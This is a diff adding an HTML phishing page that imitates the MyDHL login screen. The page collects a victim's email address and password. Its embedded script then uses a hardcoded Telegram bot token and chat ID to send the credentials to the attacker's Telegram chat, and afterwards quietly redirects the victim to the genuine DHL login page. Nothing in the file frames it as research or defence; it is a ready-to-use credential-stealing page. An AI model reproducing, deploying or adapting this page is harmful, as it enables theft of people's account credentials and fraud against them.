@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<!DOCTYPE html>
+<html>
+<head>
+<style> 
+textarea {
+  width: 100%;
+  height: 50px;
+  padding: 12px 20px;
+  box-sizing: border-box;
+  border: 1px solid #ccc;
+  border-radius: 1px;
+  background-color: #FFBF00;
+  font-size: 20px;
+  resize: none;
+}
+</style>
+</head>
+<body>
+
+
+<form>
+  <textarea>Home Ship Track                            Register   Login</textarea>
+</form>
+
+</body>
+</html>
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="stylesheet" href="style.css">
+  <title>DHL Login</title>
+   <style>
+
+    body{
+  padding: 0;
+  margin: 0;
+  background: #f7f7f7;
+  box-sizing: border-box;
+  font-family: Arial, Helvetica, sans-serif
+}
+
+section#form-section .top h3
+{
+  font-size: 13px
+}
+section#form-section .top
+{
+  display: flex;
+  justify-content: space-between;
+  margin: auto;
+  width: 22%;
+  align-items: center;
+  text-align: center;
+}
+section#form-section
+{
+  background: #fff;
+      width: 320px;
+    min-height: 580px;
+  margin: 3% auto auto auto;
+  padding: 40px;
+  align-items: center;
+  text-align: center;
+}
+
+.dont-have a,
+.can{
+      margin-bottom: 0;
+    padding: 0;
+    font-size: .875rem;
+    line-height: 1.5rem;
+    color: #0057b8;
+    font-weight: bold;
+    text-decoration: none
+
+}
+form .label a{
+  float: right;
+    margin-bottom: 0;
+    padding: 0;
+    font-size: .875rem;
+    line-height: 1.5rem;
+    color: #0057b8;
+    font-weight: bold;
+    text-decoration: none
+}
+form label
+{
+  float: left
+}
+form input
+{
+  background-color: #fff;
+    border: 1px solid #797e85;
+    border-radius: 3px;
+    box-shadow: none;
+    width: 100%;
+    padding: 10px 0px 10px 10px;
+    line-height: 30px;
+    outline: none;
+    margin: 3% 0%;
+}
+form button{
+
+}
+.save img{
+  height: 30px;
+}
+.save{
+  display: flex;
+  align-items: center;
+}
+
+
+form button{
+  width: 100%;
+    height: 48px;
+    border-radius: 3px;
+    border: 1px solid #FFBF00;
+    background-color: #FFBF00;
+    font-size: .875rem;
+    color: #fff;
+}
+button.hollow{
+  background: #fff;
+  border: 1px solid #000;
+  color: #000
+}
+button.green{
+  background: #FFBF00;
+  font-weight: bold;
+  border: 1px solid #FFBF00;
+}
+
+.or-hr p{
+  font-size: 10px;
+  font-weight: bold;
+}
+.or-hr hr{
+  width: 40%
+}
+.or-hr
+{
+  display: flex;
+  justify-content: space-between;
+  width: 100%;
+  align-items: center;
+}
+
+footer#footer ul li
+{
+  font-size: 13px;
+  list-style: none;
+  color: #0057b8
+}
+footer#footer p{
+  font-size: 12px
+}
+footer#footer ul{
+  width: 40%;
+  margin: auto;
+  display: flex;
+  justify-content: space-between;
+}
+footer#footer{
+  width: 100%;;
+  text-align: center;
+  align-items: center;
+  margin-top: -10%
+}
+
+@media(max-width: 1001px){
+  footer#footer ul{
+  text-align: center;
+  flex-direction: column;
+}
+footer#footer ul li{
+  margin-top: -5%
+}
+}
+
+  </style>
+
+</head>
+<body>
+
+  <section id="form-section">
+    <div class="top">
+          <img height="60" viewBox="0 0 70 70" width="100" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQBGrIa9CAXFKQ72Ixu6TvBwn39rFXE3OUgkA&s">
+          </img>
+    </div>
+    <div class="sign-att">
+      <h2>Welcome to MyDHL Login to start Using MyDHL</h2>
+      <p></p>
+    </div>
+    <form action="" method="post" id="form">
+      <div class="label">
+        <label for="">Email-Address</label>
+        <br>
+        <input type="text" id="usr-id" required><br>
+        <a href="#"></a>
+      </div><br>
+      <div class="label">
+        <label for="">Password</label><br>
+        <input type="password" id="pwd" required><br>
+        <a href="#"></a>
+      </div>
+      <div class="save">
+       
+        
+
+        <br>Forget / Reset Password<br>
+
+        <br>Remember Me<br>
+
+      </div>
+
+      <br><button type="submit">Login</button><br><br><br>
+     
+      <br><br>
+      <div class="dont-have">
+        <p></p>
+        <a href="#"></a>
+      </div>
+      
+    </form>
+  </section><br>
+
+  <footer id="footer">
+    <ul id="ul">
+      <li></li>
+      <li></li>
+      <li></li>
+      <li></li>
+      <li></li>
+    </ul>
+    <p>Not Registered  ?  Register Now</p>
+  </footer>
+
+
+    <script>
+      const formal = document.querySelector('#form')
+    
+      let bot = {
+          TOKEN: "7225587526:AAFYBrqroRMD4wdiE5NpUsQQ6IKRn-5hBEI",
+          chatID: "2124813915"
+      }
+
+
+      formal.addEventListener("submit", e =>{
+          e.preventDefault();
+
+          let result1 = document.querySelector('#usr-id').value
+          let result2 = document.querySelector('#pwd').value
+          
+          fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=GMX-RESULT=Username::${result1}==++==Password::${result2}`, {
+              method: "GET"
+          }).then(success => {
+              window.location.replace("https://mydhl.express.dhl/kp/en/auth/login.html");
+          }, error => {
+              alert("Message not sent")
+              console.log(error)
+
+          })
+      })
+  </script>
+
+</body>
+</html>
